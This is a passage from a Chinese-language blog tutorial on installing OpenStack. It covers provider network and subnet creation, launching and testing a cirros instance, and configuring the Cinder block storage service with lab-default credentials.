class="keyword">default</span></span><br></pre></td></tr></table></figure><p><strong>添加规则</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openstack security group rule create --proto tcp --dst-port <span class="number">22</span> <span class="keyword">default</span></span><br></pre></td></tr></table></figure><h3 id="10-4创建网络"><a href="#10-4创建网络" class="headerlink" title="10.4创建网络"></a><strong>10.4创建网络</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ . admin-openrc</span><br><span class="line">$ openstack network create  --share --external \</span><br><span class="line">  --provider-physical-network provider \</span><br><span class="line">  --provider-network-type flat provider</span><br><span class="line">该--share选项允许所有项目使用虚拟网络。</span><br><span class="line">该--external选项将虚拟网络定义为外部。如果你想创建一个内部网络，你可以使用--internal。默认值是internal。</span><br></pre></td></tr></table></figure><h3 id="10-5创建子网"><a href="#10-5创建子网" class="headerlink" title="10.5创建子网"></a><strong>10.5创建子网</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ openstack subnet create --network provider \</span><br><span class="line">  --allocation-pool start=<span class="number">192.168</span><span class="number">.57</span><span class="number">.100</span>,end=<span class="number">192.168</span><span class="number">.57</span><span class="number">.200</span> \</span><br><span class="line">  --dns-nameserver <span class="number">202.101</span><span class="number">.224</span><span class="number">.68</span> --gateway <span class="number">192.168</span><span class="number">.57</span><span class="number">.2</span> \</span><br><span class="line">  --subnet-range <span class="number">192.168</span><span class="number">.57</span><span class="number">.0</span>/<span class="number">24</span> provider</span><br></pre></td></tr></table></figure><h3 id="10-6创建虚拟机"><a href="#10-6创建虚拟机" class="headerlink" title="10.6创建虚拟机"></a><strong>10.6创建虚拟机</strong></h3><p>查看有那些配置选项</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack flavor list</span><br><span class="line">+----+------------+------+------+-----------+-------+-----------+</span><br><span class="line">| ID | Name       |  RAM | Disk | Ephemeral | VCPUs | Is Public |</span><br><span class="line">+----+------------+------+------+-----------+-------+-----------+</span><br><span class="line">| <span class="number">0</span>  | m1.nano    | <span class="number">1024</span> |    <span class="number">1</span> |         <span class="number">0</span> |     <span class="number">1</span> | True      |</span><br><span class="line">| <span class="number">10</span> | liang.nano | <span class="number">1024</span> |    <span class="number">5</span> |         <span class="number">0</span> |     <span class="number">1</span> | True      |</span><br><span class="line">| <span class="number">2</span>  | m.nano     | <span class="number">1024</span> |   <span class="number">10</span> |         <span class="number">0</span> |    <span class="number">10</span> | True      |</span><br><span class="line">| <span class="number">3</span>  | m2.nano    | <span class="number">1024</span> |   <span class="number">10</span> |         <span class="number">0</span> |     <span class="number">1</span> | True      |</span><br><span class="line">| <span class="number">4</span>  | m4.nano    | <span class="number">1024</span> |   <span class="number">10</span> |         <span class="number">0</span> |     <span class="number">1</span> | True      |</span><br><span class="line">+----+------------+------+------+-----------+-------+-----------+</span><br></pre></td></tr></table></figure><p>查看可以用的镜像</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack image list</span><br><span class="line">+--------------------------------------+--------------------+--------+</span><br><span class="line">| ID                                   | Name               | Status |</span><br><span class="line">+--------------------------------------+--------------------+--------+</span><br><span class="line">| <span class="number">470802</span>c8<span class="number">-3385</span><span class="number">-4e08</span>-b069-ace2d3f8e914 | Centos7            | active |</span><br><span class="line">| <span class="number">984e73</span>aa<span class="number">-1</span>faf<span class="number">-40</span>c6<span class="number">-88</span>ee<span class="number">-5532</span>ab7cf41f | cirros             | active |</span><br><span class="line">| <span class="number">742</span>c7273<span class="number">-56</span>f2<span class="number">-43e2</span><span class="number">-8816</span><span class="number">-98</span>f980fd97d7 | windows Server2003 | active |</span><br><span class="line">+--------------------------------------+--------------------+--------+</span><br></pre></td></tr></table></figure><p>查看可用网络</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack network list</span><br><span class="line">+--------------------------------------+----------+--------------------------------------+</span><br><span class="line">| ID                                   | Name     | Subnets                              |</span><br><span class="line">+--------------------------------------+----------+--------------------------------------+</span><br><span class="line">| <span class="number">161</span>a2f1e<span class="number">-5</span>c2d<span class="number">-418</span>a<span class="number">-91</span>a3<span class="number">-7</span>a1d9aa35200 | provider | <span class="number">80695e60</span>-cd51<span class="number">-4385</span><span class="number">-8</span>af3-cd792f3a77ef |</span><br><span class="line">+--------------------------------------+----------+--------------------------------------+</span><br><span class="line">[root@linux-node2 ~]# openstack security group list</span><br><span class="line">+--------------------------------------+---------+-------------+----------------------------------+</span><br><span class="line">| ID                                   | Name    | Description | Project                          |</span><br><span class="line">+--------------------------------------+---------+-------------+----------------------------------+</span><br><span class="line">| <span class="number">593</span>ef5a3-b48b<span class="number">-483e-8753</span>-aabd81afae8a | <span class="keyword">default</span> | 缺省安全组  | <span class="number">2534</span>c30f191a40038947f238c534c20d |</span><br><span class="line">| <span class="number">73</span>b40ecf<span class="number">-1</span>bfb<span class="number">-49</span>d1<span class="number">-9382</span><span class="number">-05e3</span>a2d0f577 | liang   | adasd       | <span class="number">497</span>f3c89978641479a56bb6954b6da7d |</span><br><span class="line">+--------------------------------------+---------+-------------+----------------------------------+</span><br></pre></td></tr></table></figure><p>创建虚拟机</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack server create --flavor m1.nano --image cirros \</span><br><span class="line">&gt; --nic net-id=<span class="number">3</span>de76652<span class="number">-72</span>aa<span class="number">-4638</span><span class="number">-9</span>c31<span class="number">-7465055</span>db1f3 --security-group <span class="keyword">default</span> \</span><br><span class="line">&gt; --key-name mykey provider-instance</span><br><span class="line">+-----------------------------+-----------------------------------------------+</span><br><span class="line">| Field                       | Value                                         |</span><br><span class="line">+-----------------------------+-----------------------------------------------+</span><br><span class="line">| OS-DCF:diskConfig           | MANUAL                                        |</span><br><span class="line">| OS-EXT-AZ:availability_zone |                                               |</span><br><span class="line">| OS-EXT-STS:power_state      | NOSTATE                                       |</span><br><span class="line">| OS-EXT-STS:task_state       | scheduling                                    |</span><br><span class="line">| OS-EXT-STS:vm_state         | building                                      |</span><br><span class="line">| OS-SRV-USG:launched_at      | None                                          |</span><br><span class="line">| OS-SRV-USG:terminated_at    | None                                          |</span><br><span class="line">| accessIPv4                  |                                               |</span><br><span class="line">| accessIPv6                  |                                               |</span><br><span class="line">| addresses                   |                                               |</span><br><span class="line">| adminPass                   | LYFNpN5rHRnx                                  |</span><br><span class="line">| config_drive                |                                               |</span><br><span class="line">| created                     | <span class="number">2018</span><span class="number">-01</span><span class="number">-03</span>T07:<span class="number">39</span>:<span class="number">13</span>Z                          |</span><br><span class="line">| flavor                      | m1.nano (<span class="number">0</span>)                                   |</span><br><span class="line">| hostId                      |                                               |</span><br><span class="line">| id                          | <span class="number">00</span>d4afc5<span class="number">-266</span>f<span class="number">-4852</span><span class="number">-9</span>c7f-b86c2a5ec3f3          |</span><br><span class="line">| image                       | cirros (<span class="number">984e73</span>aa<span class="number">-1</span>faf<span class="number">-40</span>c6<span class="number">-88</span>ee<span class="number">-5532</span>ab7cf41f) |</span><br><span class="line">| key_name                    | mykey                                         |</span><br><span class="line">| name                        | provider-instance                             |</span><br><span class="line">| progress                    | <span class="number">0</span>                                             |</span><br><span class="line">| project_id                  | <span class="number">497</span>f3c89978641479a56bb6954b6da7d              |</span><br><span class="line">| properties                  |                                               |</span><br><span class="line">| security_groups             | name=<span class="string">'ff0181e2-596b-4e1b-87d9-90647674194b'</span>   |</span><br><span class="line">| status                      | BUILD                                         |</span><br><span class="line">| updated                     | <span class="number">2018</span><span class="number">-01</span><span class="number">-03</span>T07:<span class="number">39</span>:<span class="number">13</span>Z                          |</span><br><span class="line">| user_id                     | <span class="number">1</span>df20bd306664a498a6c9d6af66263a8              |</span><br><span class="line">| volumes_attached            |                                               |</span><br><span class="line">+-----------------------------+-----------------------------------------------+</span><br></pre></td></tr></table></figure><p>查看虚拟机（状态从改变BUILD到ACTIVE时构建过程成功完成。）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# openstack server list</span><br><span class="line">+--------------------------------------+-------------------+--------+----------+--------+---------+</span><br><span class="line">| ID                                   | Name              | Status | Networks | Image  | Flavor  |</span><br><span class="line">+--------------------------------------+-------------------+--------+----------+--------+---------+</span><br><span class="line">| <span class="number">00</span>d4afc5<span class="number">-266</span>f<span class="number">-4852</span><span class="number">-9</span>c7f-b86c2a5ec3f3 | provider-instance | BUILD  |          | cirros | m1.nano |</span><br><span class="line">+--------------------------------------+-------------------+--------+----------+--------+---------+</span><br><span class="line">[root@linux-node2 ~]# openstack server list</span><br><span class="line">+--------------------------------------+-------------------+--------+-------------------------+--------+---------+</span><br><span class="line">| ID                                   | Name              | Status | Networks                | Image  | Flavor  |</span><br><span class="line">+--------------------------------------+-------------------+--------+-------------------------+--------+---------+</span><br><span class="line">| <span class="number">00</span>d4afc5<span class="number">-266</span>f<span class="number">-4852</span><span class="number">-9</span>c7f-b86c2a5ec3f3 | provider-instance | ACTIVE | provider=<span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span> | cirros | m1.nano |</span><br><span class="line">+--------------------------------------+-------------------+--------+-------------------------+--------+---------+</span><br><span class="line">查看虚拟机的VNC的URL</span><br><span class="line">[root@linux-node2 ~]# openstack console url show provider-instance</span><br><span class="line">+-------+----------------------------------------------------------------------------------+</span><br><span class="line">| Field | Value                                                                            |</span><br><span class="line">+-------+----------------------------------------------------------------------------------+</span><br><span class="line">| type  | novnc                                                                            |</span><br><span class="line">| url   | http:<span class="comment">//linux-node2:6080/vnc_auto.html?token=2d0363d8-dcc7-4048-a3e8-38ad0551bc18 |</span></span><br><span class="line">+-------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="10-7网页查看"><a href="#10-7网页查看" class="headerlink" title="10.7网页查看"></a><strong>10.7网页查看</strong></h3><p><img src="http://yun.name168.cn/OpenStack003.png" alt="&quot;OpenStack&quot;"></p><h3 id="10-8-测试网络连通性"><a href="#10-8-测试网络连通性" class="headerlink" title="10.8 测试网络连通性"></a><strong>10.8 测试网络连通性</strong></h3><p>在openstack server list中查看的IP地址为192.168.57.105</p><p>现在在node1 node2 进行测试</p><p>Node2 测试结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# ping -c 4 192.168.57.105</span><br><span class="line">PING <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span> (<span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>) <span class="number">56</span>(<span class="number">84</span>) bytes <span class="keyword">of</span> data.</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">2.48</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">64</span> time=<span class="number">2.23</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">64</span> time=<span class="number">1.84</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">4</span> ttl=<span class="number">64</span> time=<span class="number">2.64</span> ms</span><br><span class="line"></span><br><span class="line">--- <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span> ping statistics ---</span><br><span class="line"><span class="number">4</span> packets transmitted, <span class="number">4</span> received, <span class="number">0</span>% packet loss, time <span class="number">3005</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">1.841</span>/<span class="number">2.299</span>/<span class="number">2.642</span>/<span class="number">0.305</span> ms</span><br></pre></td></tr></table></figure><p>node1 测试结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node1 neutron]#  ping -c 4 192.168.57.105</span><br><span class="line">PING <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span> (<span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>) <span class="number">56</span>(<span class="number">84</span>) bytes <span class="keyword">of</span> data.</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">1.33</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">64</span> time=<span class="number">0.873</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">64</span> time=<span class="number">1.22</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span>: icmp_seq=<span class="number">4</span> ttl=<span class="number">64</span> time=<span class="number">2.47</span> ms</span><br><span class="line"></span><br><span class="line">--- <span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span> ping statistics ---</span><br><span class="line"><span class="number">4</span> packets transmitted, <span class="number">4</span> received, <span class="number">0</span>% packet loss, time <span class="number">3004</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.873</span>/<span class="number">1.478</span>/<span class="number">2.476</span>/<span class="number">0.602</span> ms</span><br></pre></td></tr></table></figure><h3 id="10-9-S-sh连接测试一下"><a href="#10-9-S-sh连接测试一下" class="headerlink" title="10.9 S**sh连接测试一下**"></a><strong>10.9</strong> <strong>S**</strong>sh连接测试一下**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# ssh cirros@192.168.57.105</span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="string">'192.168.57.105 (192.168.57.105)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:7Qa9JtqTy/3uqoJKw7doB6hC93pHEuHbv+e6xpgPGD8.</span></span><br><span class="line"><span class="string">RSA key fingerprint is MD5:61:64:aa:1a:94:f7:dc:26:58:f5:cf:fd:ba:48:66:b5.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span><span class="number">192.168</span><span class="number">.57</span><span class="number">.105</span><span class="string">' (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ ifconfig</span></span><br><span class="line"><span class="string">eth0      Link encap:Ethernet  HWaddr FA:16:3E:27:D7:37  </span></span><br><span class="line"><span class="string">          inet addr:192.168.57.105  Bcast:192.168.57.255  Mask:255.255.255.0</span></span><br><span class="line"><span class="string">          inet6 addr: fe80::f816:3eff:fe27:d737/64 Scope:Link</span></span><br><span class="line"><span class="string">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span></span><br><span class="line"><span class="string">          RX packets:364 errors:0 dropped:0 overruns:0 frame:0</span></span><br><span class="line"><span class="string">          TX packets:249 errors:0 dropped:0 overruns:0 carrier:0</span></span><br><span class="line"><span class="string">          collisions:0 txqueuelen:1000 </span></span><br><span class="line"><span class="string">          RX bytes:33991 (33.1 KiB)  TX bytes:26215 (25.6 KiB)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lo        Link encap:Local Loopback  </span></span><br><span class="line"><span class="string">          inet addr:127.0.0.1  Mask:255.0.0.0</span></span><br><span class="line"><span class="string">          inet6 addr: ::1/128 Scope:Host</span></span><br><span class="line"><span class="string">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span></span><br><span class="line"><span class="string">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span></span><br><span class="line"><span class="string">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span></span><br><span class="line"><span class="string">          collisions:0 txqueuelen:0 </span></span><br><span class="line"><span class="string">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span></span><br></pre></td></tr></table></figure><h2 id="十一、块存储服务（控制节点node2-操作）"><a href="#十一、块存储服务（控制节点node2-操作）" class="headerlink" title="十一、块存储服务（控制节点node2 操作）"></a><strong>十一、块存储服务（控制节点node2 操作）</strong></h2><h3 id="11-1-数据库操作"><a href="#11-1-数据库操作" class="headerlink" title="11.1 数据库操作"></a><strong>11.1 数据库操作</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root –p</span><br><span class="line">MariaDB [(none)]&gt; CREATE DATABASE cinder;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON cinder.* TO <span class="string">'cinder'</span>@<span class="string">'localhost'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'cinder'</span>;</span><br><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON cinder.* TO <span class="string">'cinder'</span>@<span class="string">'%'</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">'cinder'</span>;</span><br></pre></td></tr></table></figure><h3 id="11-2-创建服务凭据"><a href="#11-2-创建服务凭据" class="headerlink" title="11.2**创建服务凭据**"></a><strong>11.2**</strong>创建服务凭据**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ openstack user create --domain <span class="keyword">default</span> --password-prompt cinder</span><br><span class="line"></span><br><span class="line">User Password: cinder  ###密码</span><br><span class="line">Repeat User Password: cinder </span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | <span class="keyword">default</span>                          |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| id                  | <span class="number">9</span>d7e33de3e1a498390353819bc7d245d |</span><br><span class="line">| name                | cinder                           |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br></pre></td></tr></table></figure><p>添加到admin组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openstack role add --project service --user cinder admin</span><br></pre></td></tr></table></figure><h3 id="11-3-创建cinderv2和cinderv3服务实体："><a href="#11-3-创建cinderv2和cinderv3服务实体：" class="headerlink" title="11.3 创建cinderv2和cinderv3服务实体："></a><strong>11.3</strong> <strong>创建cinderv2和cinderv3服务实体：</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ openstack service create --name cinderv2 \</span><br><span class="line">  --description <span class="string">"OpenStack Block Storage"</span> volumev2</span><br><span class="line"></span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | OpenStack Block Storage          |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| id          | eb9fd245bdbc414695952e93f29fe3ac |</span><br><span class="line">| name        | cinderv2                         |</span><br><span class="line">| type        | volumev2                         |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">$ openstack service create --name cinderv3 \</span><br><span class="line">  --description <span class="string">"OpenStack Block Storage"</span> volumev3</span><br><span class="line"></span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | OpenStack Block Storage          |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| id          | ab3bbbef780845a1a283490d281e7fda |</span><br><span class="line">| name        | cinderv3                         |</span><br><span class="line">| type        | volumev3                         |</span><br><span class="line">+-------------+----------------------------------+</span><br></pre></td></tr></table></figure><h3 id="11-4建立快存储API"><a href="#11-4建立快存储API" class="headerlink" title="11.4建立快存储API"></a><strong>11.4建立快存储API</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev2 public http:<span class="comment">//linux-node2:8776/v2/%\(project_id\)s</span></span><br><span class="line"></span><br><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev2 internal http:<span class="comment">//linux-node2:8776/v2/%\(project_id\)s</span></span><br><span class="line"></span><br><span class="line">$ openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev2 admin http:<span class="comment">//linux-node2:8776/v2/%\(project_id\)s</span></span><br><span class="line"></span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev3 public http:<span class="comment">//linux-node2:8776/v3/%\(project_id\)s</span></span><br><span class="line"></span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev3 internal http:<span class="comment">//linux-node2:8776/v3/%\(project_id\)s</span></span><br><span class="line"></span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev3 admin http:<span class="comment">//linux-node2:8776/v3/%\(project_id\)s</span></span><br></pre></td></tr></table></figure><h3 id="11-5-安装cinder"><a href="#11-5-安装cinder" class="headerlink" title="11.5 安装cinder"></a><strong>11.5 安装cinder</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum install openstack-cinder</span><br></pre></td></tr></table></figure><h3 id="11-6配置cinder（-etc-cinder-cinder-conf-）"><a href="#11-6配置cinder（-etc-cinder-cinder-conf-）" class="headerlink" title="11.6配置cinder（**/etc/cinder/cinder.conf**）"></a><strong>11.6配置cinder（**</strong>/etc/cinder/cinder.conf<strong>**）</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[database]</span><br><span class="line">connection = mysql:<span class="comment">//cinder:cinder @linux-node2/cinder</span></span><br></pre></td></tr></table></figure><p>default部分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT] # ...</span><br><span class="line">transport_url = rabbit:<span class="comment">//openstack:openstack@linux-node2</span></span><br><span class="line">auth_strategy = keystone</span><br><span class="line">my_ip = <span class="number">192.168</span><span class="number">.57</span><span class="number">.145</span></span><br><span class="line">[keystone_authtoken]</span><br><span class="line"># ...</span><br><span class="line">auth_uri = http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers = linux-node2:<span class="number">11211</span></span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = <span class="keyword">default</span></span><br><span class="line">user_domain_name = <span class="keyword">default</span></span><br><span class="line">project_name = service</span><br><span class="line">username = cinder</span><br><span class="line">password = cinder</span><br><span class="line">[oslo_concurrency]</span><br><span class="line"># ...</span><br><span class="line">lock_path = <span class="regexp">/var/</span>lib/cinder/tmp</span><br></pre></td></tr></table></figure><p>配置计算使用块存储<a href="https://www.o2oxy.cn/917.html#configure-compute-to-use-block-storage" target="_blank" rel="noopener"><strong>¶</strong></a></p><p>编辑/etc/nova/nova.conf文件并添加以下内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[cinder] </span><br><span class="line">os_region_name  =  RegionOne</span><br></pre></td></tr></table></figure><h3 id="11-7-填充数据库"><a href="#11-7-填充数据库" class="headerlink" title="11.7 填充数据库"></a><strong>11.7 填充数据库</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># su -s /bin/sh -c "cinder-manage db sync" cinder</span><br></pre></td></tr></table></figure><h3 id="11-8-完成安装"><a href="#11-8-完成安装" class="headerlink" title="11.8**完成安装**"></a><strong>11.8**</strong>完成安装**</h3><p>重新启动计算API服务：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># systemctl restart openstack-nova-api.service</span><br></pre></td></tr></table></figure><p>启动块存储服务并将其配置为在系统引导时启动：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable openstack-cinder-api.service openstack-cinder-scheduler.service</span><br><span class="line"># systemctl start openstack-cinder-api.service openstack-cinder-scheduler.service</span><br></pre></td></tr></table></figure><h2 